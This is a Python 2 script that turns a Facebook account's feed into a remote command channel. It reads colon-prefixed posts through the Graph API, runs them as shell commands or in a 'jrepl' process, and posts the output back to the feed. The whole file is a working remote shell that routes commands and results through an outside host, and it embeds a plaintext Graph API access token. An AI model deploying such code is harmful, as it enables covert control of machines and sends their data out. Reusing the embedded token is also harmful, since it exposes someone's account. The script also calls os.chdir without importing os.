from os import system
from facepy import GraphAPI 
from subprocess import Popen, PIPE
graph = GraphAPI('CAAYGdFK3zvYBAOJOgQ9kXQz81DQirsPod1yuljgJlftsETgSW3RWa9hOTzyVeZCXfK0ZCZAZBu6usP9d3mnFUbZAuvq4UGc0PGFsZBHHnej6qhmyDnqZBwchvYbySFLKfzCLNXIRmi5KVZB0yX5zb4wxKQZBVngQEXZAhKef8kZAVQVSImlhy0GGAZBVeexZAnCuwGCL75RsHZA1nnMgZDZD')
a = graph.get('me/feed')
last = a['data'][0]['message']
fileCreated = False
while True:
    if fileCreated:
        system('del output.txt')
        fileCreated = False
    a = graph.get('me/feed')
    cmd = a['data'][0]['message']
    fileCreated = False    
    if cmd[0] == ':' and cmd!=last:
        if cmd[1:]=='exit':
            exit()
        if cmd[1:]=='start-jrepl':
            print "Starting Jrepl"
            last = cmd
            p = Popen(["jrepl"], shell=True, stdin=PIPE, stdout=PIPE)
            while True:
                toPost = 'type :stop-jrepl to exit\n'
                a = graph.get('me/feed')
                jcmd = a['data'][0]['message']
                if jcmd[0]==':' and jcmd == ':stop-jrepl':
                    p.stdin.write('exit'+'\n')
                    last = ':'+jcmd
                    print "Stopping Jrepl"
                    break
                elif jcmd!='' and jcmd!=last and jcmd[0]==':':
                    jcmd = jcmd[1:]
                    p.stdin.write(jcmd+'\n')
                    p.stdin.flush()
                    response = ''
                    while not "[" in response:
                        response = p.stdout.readline()
                    toPost+=response
                    while '----' not in response:
                        response = p.stdout.readline()
                        if response!='':
                            toPost+="\n"+response
                    print toPost
                    graph.post('me/feed', message=toPost)
                last = jcmd
        else:
            if cmd[1:3]=='cd':
                os.chdir(cmd[4:])
                fileCreated = False
            else:
                # if cmd[0:5] == 'echo' or cmd[0:4] == 'dir':
                fileCreated = True
                if cmd[1:5] == 'echo':
                   # print cmd
                   pass
                system(cmd[1:]+'> output.txt')
                print cmd
            last = cmd
    if fileCreated:
        outputFile = open('output.txt', 'r')
        output = outputFile.read()
        outputFile.close()
        if len(output)!=0:
            print output
            graph.post('me/feed', message=output)

